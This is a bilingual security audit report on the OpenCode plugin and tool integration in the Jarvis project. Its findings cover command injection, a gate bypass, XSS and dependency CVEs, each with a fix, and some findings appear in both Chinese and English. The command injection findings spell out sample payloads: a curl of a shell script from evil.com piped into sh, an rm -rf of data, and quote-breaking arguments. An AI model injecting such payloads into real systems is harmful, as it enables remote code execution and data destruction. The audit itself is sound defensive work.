# 安全审计报告：OpenCode 集成变更

**日期**：2026-05-09
**审计范围**：OpenCode 插件、工具、CLI Hook、平台信息增强、Agent 模板
**严重度**：Critical > High > Medium > Low > Info

---

## 1. 审计范围与威胁模型

### 1.1 审查文件

| 文件 | 变更性质 |
|------|---------|
| src/templates/platforms/opencode/plugins/jarvis-gate-check.ts | 新增 OpenCode 原生插件（Hook execSync + fetch） |
| src/templates/platforms/opencode/tools/jarvis-gate-check.ts | 新增 gate_check 工具（execSync CLI） |
| src/templates/platforms/opencode/tools/jarvis-gate-advance.ts | 新增 gate_advance 工具（execSync CLI） |
| src/templates/platforms/opencode/tools/jarvis-agent-config.ts | 新增 agent_config 工具（execSync CLI） |
| src/templates/platforms/opencode/tools/jarvis-report.ts | 新增 report_status 工具（execSync CLI） |
| src/templates/platforms/opencode/tools/jarvis-pipeline-status.ts | 新增 pipeline_status 工具（execSync CLI） |
| src/hook.ts | 新增 CLI jarvis hook 子命令 |
| src/engine/server.ts | 变更 platform_info MCP 工具 |
| src/cli.ts | 变更 build 脚本 rmSync |
| src/web/routes.ts | 变更新增 API 端点 |
| package.json | 变更 build 脚本 |
| src/templates/platforms/opencode/package.json | 新增 @opencode-ai/plugin 依赖 |

### 1.2 威胁模型（STRIDE）

| 威胁 | 等级 | 说明 |
|------|------|------|
| Spoofing | Medium | API 无认证令牌 |
| Tampering | Medium | execSync 参数无净化 |
| Repudiation | Low | 非变更范围 |
| Info Disclosure | Medium | platform_info 暴露 Agent 元数据 |
| DoS | Low | localhost only |
| Elevation of Privilege | High | 命令注入可致 RCE |

### 1.3 信任边界

OpenCode Agent --(execSync)--> jarvis CLI + Engine (localhost:3456)
信任但脆弱：AI 参数直接拼接进 shell，无输入净化层。

### 1.4 攻击树

A) 注入 shell 元字符到 agent_id/gate/operation -> 以用户权限执行任意命令
B) 引擎崩溃绕过 Gate 检查（tool.execute.before 无 try/catch）
C) 供应链攻击（CDN 无 SRI、@opencode-ai/plugin 已知 CVE 生态）

---

## 2. 发现清单

### 2.1 S01 - CVE-2026-22812: OpenCode 生态未认证 RCE（High）

**严重度**：High / CVSS 8.8
**CWE**：CWE-306
**OWASP**：A01:2021 - Broken Access Control
**文件**：src/templates/platforms/opencode/package.json L3
**类别**：依赖安全

**描述**：项目依赖 @opencode-ai/plugin@1.4.0，该包所属 OpenCode 生态存在 CVE-2026-22812 (CVSS 8.8)。
OpenCode 自动启动未认证 HTTP 服务器，暴露 /session/:id/shell 等端点，允许本地恶意进程执行任意 shell 命令。
有公开 PoC exploit。

**修复**：升级 opencode-ai >= 1.0.216；文档中增加安全提醒。

---

### 2.2 S02 - CVE-2026-22813: OpenCode XSS to RCE（Critical）

**严重度**：Critical / CVSS 9.4
**CWE**：CWE-79
**OWASP**：A03:2021 - Injection
**文件**：src/templates/platforms/opencode/package.json L3
**类别**：依赖安全

**描述**：CVE-2026-22813 (CVSS 9.4) 影响 OpenCode < 1.1.10。Markdown 渲染器不做 HTML 消毒（无 DOMPurify/CSP），
恶意网站可通过 URL override 注入 JavaScript，利用 /pty/ API 执行系统命令。
与 Jarvis pipeline.html 的 marked.js 不消毒模式（S07）属同类缺陷，纵深防御完全缺失。

**修复**：警告用户升级 OpenCode >= 1.1.10；两个 CVE 均为公开 exploit，应立即通告。

---

### 2.3 S03 - 命令注入：agent_id 直接拼接 shell（High）

**严重度**：High / CVSS 7.8 | **CWE**：CWE-78 | **OWASP**：A03:2021
**文件**：src/templates/platforms/opencode/tools/jarvis-agent-config.ts L26-31
**类别**：命令注入

**描述**：args.agent_id / model / effort 直接模板字符串拼接到 execSync 命令，无转义无净化。



攻击载荷：agent_id = "test; curl http://evil.com/shell.sh | sh"

**修复（P0）**：白名单校验 agent_id 格式 ^[a-z][w-]*$；model 从已知列表匹配；effort 枚举校验。

---

### 2.4 S04 - 命令注入：operation 参数未转义（High）

**严重度**：High / CVSS 7.8 | **CWE**：CWE-78 | **OWASP**：A03:2021
**文件**：src/templates/platforms/opencode/tools/jarvis-gate-check.ts L19-20
**类别**：命令注入

**描述**：args.operation 直接拼接到 execSync，无引号无转义。



攻击载荷：operation = "spawn_impl; id > /tmp/pwned"

**修复（P0）**：严格白名单校验，仅接受已知 Gate operation 枚举值。

---

### 2.5 S05 - 命令注入：gate 参数双引号防护不足（Medium）

**严重度**：Medium / CVSS 6.3 | **CWE**：CWE-78 | **OWASP**：A03:2021
**文件**：src/templates/platforms/opencode/tools/jarvis-gate-advance.ts L19-20
**类别**：命令注入

**描述**：args.gate 被双引号包裹但不充分。



旁路载荷：gate = " Gate C"; id > /tmp/pwned; echo ""
生成：jarvis hook gate-advance --gate "Gate C"; id > /tmp/pwned; echo ""

**修复**：白名单校验 args.gate 枚举值。永远不要让用户输入直接接触 shell。
### 2.1 S01 - CVE-2026-22812: OpenCode Unauthenticated RCE (High)

**Severity**: High / CVSS 8.8 | **CWE**: CWE-306 | **OWASP**: A01:2021
**File**: src/templates/platforms/opencode/package.json L3 | **Category**: Dependency

Project depends on @opencode-ai/plugin@1.4.0. OpenCode ecosystem has CVE-2026-22812 (CVSS 8.8),
affecting opencode-ai < 1.0.216. OpenCode auto-starts unauthenticated HTTP server exposing
/session/:id/shell, allowing local processes to execute arbitrary commands. Public PoC exists.

**Fix**: Upgrade opencode-ai >= 1.0.216. Add security advisory to Jarvis documentation.

---

### 2.2 S02 - CVE-2026-22813: OpenCode XSS to RCE (Critical)

**Severity**: Critical / CVSS 9.4 | **CWE**: CWE-79 | **OWASP**: A03:2021
**File**: src/templates/platforms/opencode/package.json | **Category**: Dependency

CVE-2026-22813 (CVSS 9.4) affects OpenCode < 1.1.10.
Markdown renderer does no HTML sanitization (no DOMPurify/CSP).
Malicious websites can inject JS via URL override and execute
system commands through /pty/ API endpoint.
Same defect pattern as Jarvis pipeline.html marked.js usage (see S07).

**Fix**: Warn users to upgrade OpenCode >= 1.1.10.
Both CVEs (22812+22813) have public exploits. Add advisory to docs.

---

### 2.3 S03 - Command Injection: agent_id in shell (High)

**Severity**: High / CVSS 7.8 | **CWE**: CWE-78 | **OWASP**: A03:2021
**File**: src/templates/platforms/opencode/tools/jarvis-agent-config.ts L26-31
**Category**: Command Injection

args.agent_id, args.model, args.effort are directly concatenated
into execSync shell command with absolutely no escaping or sanitization.

Vulnerable code pattern:
  cmdParts = ["jarvis hook agent-config", "--agent-id " + args.agent_id]
  cmdParts.join(" ") -> passed to execSync

Attack payload examples:
  agent_id = "test; curl http://evil.com/shell.sh | sh"
  agent_id = "x && rm -rf /important/data"

**Fix (P0 - HIGHEST PRIORITY)**:
1. Validate agent_id against regex: /^[a-z][a-z0-9-]*$/
2. Whitelist model from known model list
3. Validate effort against enum: low|medium|high|xhigh|max
4. Never concatenate user input into shell command strings
---

### 2.4 S04 - Command Injection: operation parameter (High)

**Severity**: High / CVSS 7.8 | **CWE**: CWE-78 | **OWASP**: A03:2021
**File**: src/templates/platforms/opencode/tools/jarvis-gate-check.ts L19-20
**Category**: Command Injection

args.operation is directly concatenated to execSync shell command
with NO quoting and NO escaping whatsoever.

Vulnerable code:
  execSync("jarvis hook gate-check --operation " + args.operation,
           { encoding: "utf-8", timeout: 10_000 })

Attack payload: operation = "spawn_impl; id > /tmp/pwned"

Note: This tool is exposed to AI Agent with operation values like
spawn_impl/write_code/build/review/deploy. Malicious prompt injection
could cause Agent to invoke this tool with malicious operation.

**Fix (P0)**: Strict whitelist against known Gate operation enum values.

---

### 2.5 S05 - Command Injection: gate param quoting bypass (Medium)

**Severity**: Medium / CVSS 6.3 | **CWE**: CWE-78 | **OWASP**: A03:2021
**File**: src/templates/platforms/opencode/tools/jarvis-gate-advance.ts L19-20
**Category**: Command Injection

args.gate is wrapped in double quotes but can be escaped with embedded quotes.

Vulnerable code:
  execSync("jarvis hook gate-advance --gate "" + args.gate + """, {...})

Bypass payload:
  gate = "Gate C"; id > /tmp/pwned; echo ""
Expands to: jarvis hook gate-advance --gate "Gate C"; id > /tmp/pwned; echo ""

**Fix**: Whitelist gate enum values against known Gate names.
---

### 2.6 S06 - Gate bypass: tool.execute.before missing try/catch (Medium)

**Severity**: Medium / CVSS 5.3 | **CWE**: CWE-754 | **OWASP**: A01:2021
**File**: src/templates/platforms/opencode/plugins/jarvis-gate-check.ts L47-58
**Category**: Authorization Bypass

tool.execute.before is the ONLY hard-block point for Gate enforcement.
When engine is unreachable, execSync throws (exit code 2) but there is
NO try/catch wrapper. Compare with tool.execute.after (L64-87) which
DOES have try/catch for the same operation.

Bypass scenario:
1. Attacker kills engine process (or engine crashes)
2. Agent attempts Task/Agent/Write (blockable tools)
3. execSync throws in tool.execute.before -- uncaught!
4. If OpenCode silently swallows the uncaught error, Gate check is bypassed
5. Attacker operates without Gate restrictions

**Fix**: Add try/catch with fail-secure behavior:
  engine unavailable -> throw Error to BLOCK the tool call

---

### 2.7 S07 - XSS via marked.js without HTML sanitization (Medium, RECURRENCE)

**Severity**: Medium / CVSS 6.1 | **CWE**: CWE-79 | **OWASP**: A03:2021
**File**: src/web/views/pipeline.html L11, L879-880
**Category**: Stored XSS

This was flagged in prior security audit (S01 in 2026-05-09 report)
but was NOT fixed in this change -- RECURRENCE finding.

marked.js loaded from CDN without version pinning or SRI hash.
marked.parse(md) output is inserted via innerHTML with NO DOMPurify.

Same vulnerability pattern as CVE-2026-22813 (CVSS 9.4 in OpenCode itself).
Combined with S08 (no CSP header), there is zero XSS defense in depth.

Attack vector: attacker writes malicious .md file to docs/ directory
(via compromised Agent with Write capability). User opens doc drawer.
Content loaded via /api/docs/:filepath, rendered by marked.js,
inserted via innerHTML -> script execution.

**Fix**:
1. Add DOMPurify: content.innerHTML = DOMPurify.sanitize(html)
2. Pin CDN version + add SRI integrity hash
3. Add Content-Security-Policy header as defense in depth
---

### 2.8 S08 - No security headers on web server (Medium)

**Severity**: Medium / CVSS 5.0 | **CWE**: CWE-693 | **OWASP**: A05:2021
**File**: src/engine/server.ts, src/web/routes.ts
**Category**: Security Misconfiguration

Hono web server sets NO security response headers on either
dashboard (port 3457) or engine API (port 3456):

| Missing Header | Risk |
|----------------|------|
| CSP | XSS has no last line of defense |
| X-Content-Type-Options | MIME sniffing attacks |
| X-Frame-Options | Clickjacking |
| Referrer-Policy | Information leakage |

Engine binds 127.0.0.1, limiting risk. However, if port forwarding
is configured, attack surface expands dramatically.

**Fix**: Add Hono middleware to set security headers.

---

### 2.9 S09 - CDN scripts without SRI integrity (Medium)

**Severity**: Medium / CVSS 6.1 | **CWE**: CWE-829 | **OWASP**: A08:2021
**File**: src/web/views/pipeline.html L11
**Category**: Supply Chain Security

marked.js loaded from cdn.jsdelivr.net with no version pinning
and no SRI (Subresource Integrity) hash. CDN compromise would
inject malicious scripts into all Jarvis dashboard users.

Combined with S07 (marked.js HTML injection), attack chain is complete.

**Fix**: Pin to specific version + add SRI integrity hash.
---

### 2.10 S10 - REST API has no authentication (Low)

**Severity**: Low / CVSS 3.3 | **CWE**: CWE-306 | **OWASP**: A01:2021
**File**: src/web/routes.ts (all endpoints)
**Category**: Missing Authentication

All REST API endpoints are completely unauthenticated. Any process
with access to localhost:3456 can read/write pipeline state.

Mitigation: engine binds 127.0.0.1 only. Personal developer tool.
If future versions expose engine to LAN/remote, token auth is needed.

---

### 2.11 S11 - platform_info exposes excessive data (Low)

**Severity**: Low / CVSS 2.7 | **CWE**: CWE-200 | **OWASP**: A01:2021
**File**: src/engine/server.ts L198-229
**Category**: Information Disclosure

resolvePlatformInfo() returns full agent metadata: IDs, names, roles,
categories, default models, effort levels. Exposed via MCP tool.

Mitigation: localhost only. Information value is low. Acceptable for now.

---

### 2.12 S12 - render-graphs.js execSync stdin injection risk (Low)

**Severity**: Low / CVSS 3.1 | **CWE**: CWE-78 | **OWASP**: A03:2021
**File**: src/templates/platforms/opencode/skills/writing-skills/render-graphs.js L72

dot -Tsvg command receives DOT source via stdin from SKILL.md files.
While templates are trusted, Graphviz CVEs exist (e.g., CVE-2018-10177).

---

### 2.13 S13 - CLI rmSync path traversal already mitigated (Info)

**Severity**: Info | **CWE**: CWE-22
**File**: src/cli.ts L197, L301

rmSync paths derived from PLATFORMS whitelist validation. No path traversal
possible. Confirmed safe.

---

### 2.14 S14 - build script rmSync node_modules (Info)

**Severity**: Info
**File**: package.json L43

Build script cleans dist/src/templates/platforms/opencode/node_modules.
Hardcoded path, try/catch wrapped. Safe build cleanup. No risk.

---

## 3. Dependency Audit

### 3.1 npm audit

Result: 0 vulnerabilities (info=0, low=0, moderate=0, high=0, critical=0)

### 3.2 OpenCode Ecosystem CVEs

| CVE | Component | CVSS | Fixed In |
|-----|-----------|------|----------|
| CVE-2026-22812 | opencode-ai Unauthenticated RCE | 8.8 | >= 1.0.216 |
| CVE-2026-22813 | OpenCode XSS to RCE | 9.4 | >= 1.1.10 |

@opencode-ai/plugin@1.4.0 has no direct CVE but is in the same ecosystem.
Socket.dev score: 70/100 (moderate risk).

### 3.3 CDN Dependencies

| Resource | SRI | Version Pinned | Risk |
|----------|-----|----------------|------|
| marked.js (cdn.jsdelivr.net) | No | No | Supply chain hijack |


---

## 4. Security Headers Assessment

| Header | Status | Risk |
|--------|--------|------|
| Content-Security-Policy | NOT SET | XSS has no defense |
| X-Content-Type-Options | NOT SET | MIME sniffing |
| X-Frame-Options | NOT SET | Clickjacking |
| Strict-Transport-Security | N/A (localhost) | N/A |
| Referrer-Policy | NOT SET | Info leak |
| Permissions-Policy | NOT SET | Feature abuse |
| Access-Control-Allow-Origin | Not present (same-origin default) | Safe |

Conclusion: Security headers are severely lacking. Combined with
marked.js XSS (S07), the web panel lacks basic attack mitigation layers.


---

## 5. Secret Leak Detection

Scan scope: all src/ TypeScript and JavaScript source files.

| Check | Result |
|-------|--------|
| Hardcoded passwords/tokens | None found |
| API keys in source | None found |
| .env exposure | None found (JARVIS_ENGINE_URL has localhost fallback, expected) |
| .gitignore completeness | Complete (.env, *.token, *.pem, *.key, credentials.*) |

Conclusion: Secret management is healthy. No hardcoded credentials.

---

## 6. Remediation Priority Matrix

| Priority | ID | Severity | Effort | Hours |
|----------|----|---------|--------|-------|
| **P0-IMMEDIATE** | S03 | High | Whitelist validation | 2h |
| **P0-IMMEDIATE** | S04 | High | Whitelist validation | 1h |
| **P1-THIS WEEK** | S02 | Critical | Dep upgrade + user advisory | 2h |
| **P1-THIS WEEK** | S01 | High | Dep audit + docs | 2h |
| **P1-THIS WEEK** | S06 | Medium | Add try/catch | 0.5h |
| **P1-THIS WEEK** | S07 | Medium | Add DOMPurify | 2h |
| **P1-THIS WEEK** | S09 | Medium | Add SRI hash | 0.5h |
| **P2-2 WEEKS** | S05 | Medium | Whitelist validation | 1h |
| **P2-2 WEEKS** | S08 | Medium | Security header middleware | 1h |
| **P3-PLANNED** | S10 | Low | Token auth | 4h |
| **P3-PLANNED** | S11 | Low | Limit response fields | 1h |
| **P3-PLANNED** | S12 | Low | Code review pass | 0h |
| **CLOSED** | S13 | Info | N/A | 0h |
| **CLOSED** | S14 | Info | N/A | 0h |


---

## 7. Gate D Release Decision

**Verdict: APPROVED WITH CONDITIONS**

| Condition | Detail |
|-----------|--------|
| **MUST FIX** | S03 + S04 (command injection) -- real injection vulnerabilities in functional code |
| **MUST FIX** | S06 (Gate bypass) -- add try/catch fail-secure mode |
| **STRONGLY RECOMMENDED** | S07 (marked.js XSS) -- public exploit pattern exists (CVE-2026-22813) |
| **STRONGLY RECOMMENDED** | User advisory: upgrade OpenCode to >= 1.1.10 (mitigates S01+S02) |
| **CAN DEFER** | S08 (security headers), S10 (API auth) -- lower risk, localhost only |

**NOT BLOCKED**: If P0/P1 fixes are completed before merge, release can proceed.
S01/S02 are external dependency vulnerabilities that cannot be patched in
project code directly. Advisory must be included in release notes.


---

## 8. Appendix

### A. Audit Methodology

- Static code review (manual line-by-line analysis)
- Threat modeling (STRIDE + Attack Tree)
- Dependency audit (npm audit + CVE database lookup)
- Pattern search (secret detection, execSync patterns, innerHTML patterns)
- Security header analysis

### B. Review Limitations

This audit is read-only static analysis. Not in scope:
- Dynamic runtime vulnerabilities (require live testing)
- OpenCode framework internal implementation details
- Real-time CDN service security assessment
- Operating system security configuration

### C. References

- [CVE-2026-22812](https://nvd.nist.gov/vuln/detail/CVE-2026-22812) -- OpenCode Unauthenticated RCE
- [CVE-2026-22813](https://nvd.nist.gov/vuln/detail/CVE-2026-22813) -- OpenCode XSS to RCE
- [GHSA-vxw4-wv6m-9hhh](https://github.com/advisories/GHSA-vxw4-wv6m-9hhh) -- GitHub Advisory
- [Socket.dev: @opencode-ai/plugin](https://socket.dev/npm/package/@opencode-ai/plugin)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html) -- OS Command Injection
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html) -- Cross-site Scripting
- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)